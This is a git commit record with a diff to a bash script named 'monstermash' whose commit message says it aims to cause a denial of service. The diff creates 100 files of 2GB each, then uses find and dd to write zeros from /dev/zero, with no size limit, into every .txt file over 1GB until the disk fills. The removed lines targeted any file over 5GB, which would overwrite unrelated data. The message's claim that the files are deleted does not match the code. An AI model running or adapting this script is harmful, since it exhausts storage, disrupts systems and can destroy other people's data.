e322f090b2e6b9eed67854f569f36a34831ef307
robinh00d <160340727+djrk01@users.noreply.github.com>
2024-11-18 22:47:15 -0500

    monstermash.sh
    Creates 100 2GB Files then deletes them, aiming to drain memory space and create DOS

--- mmash.sh
+++ mmash.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 #monstermash
-# Create 10 1GB text files
-for i in {1..10}; do
+# Create 100 2GB text files
+for i in {1..100}; do
   filename="file_$i.txt"
   touch "$filename"
-  truncate -s 1G "$filename"
+  truncate -s 2G "$filename"
 done
-
-# Search for files greater than 5GB and fill them with zeros
-find . -type f -size +5G -exec dd if=/dev/zero of={} bs=1M \;
+sleep 10
+# Search for files greater than 1GB and fill them with zeros
+find . -type f -name "*.txt" -size +1G -exec dd if=/dev/zero of={} bs=1M \;
